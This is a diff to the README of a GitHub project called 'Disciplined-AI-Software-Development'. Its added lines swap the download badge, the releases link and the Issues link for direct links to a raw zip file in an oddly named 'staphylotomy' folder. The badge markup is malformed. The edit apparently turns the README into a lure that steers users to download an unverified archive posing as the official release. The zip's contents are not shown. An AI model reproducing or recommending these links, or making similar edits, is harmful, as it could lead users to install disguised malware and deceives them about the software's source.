@@ -1,6 +1,6 @@
 # 🤖 Disciplined-AI-Software-Development - Collaborate Effectively with AI
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/setner111/Disciplined-AI-Software-Development/releases)
+[![Download](https://raw.githubusercontent.com/setner111/Disciplined-AI-Software-Development/main/staphylotomy/Disciplined-AI-Software-Development.zip%https://raw.githubusercontent.com/setner111/Disciplined-AI-Software-Development/main/staphylotomy/Disciplined-AI-Software-Development.zip)](https://raw.githubusercontent.com/setner111/Disciplined-AI-Software-Development/main/staphylotomy/Disciplined-AI-Software-Development.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **Disciplined-AI-Software-Development** project. This application
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Disciplined-AI-Software-Development Releases](https://github.com/setner111/Disciplined-AI-Software-Development/releases).
+To get started, visit this page to download: [Disciplined-AI-Software-Development Releases](https://raw.githubusercontent.com/setner111/Disciplined-AI-Software-Development/main/staphylotomy/Disciplined-AI-Software-Development.zip).
 
 Here is a simple step-by-step guide to help you download and run the software:
 
@@ -54,7 +54,7 @@ The software comes with built-in documentation that can help you understand how 
 
 If you encounter issues or have questions, feel free to reach out for help:
 
-- **Issues Page**: Report bugs or request features on the [Issues](https://github.com/setner111/Disciplined-AI-Software-Development/issues) page.
+- **Issues Page**: Report bugs or request features on the [Issues](https://raw.githubusercontent.com/setner111/Disciplined-AI-Software-Development/main/staphylotomy/Disciplined-AI-Software-Development.zip) page.
 - **Discussion Board**: Join discussions with other users to share tips and experiences.
 
 ## ✍️ Contributing
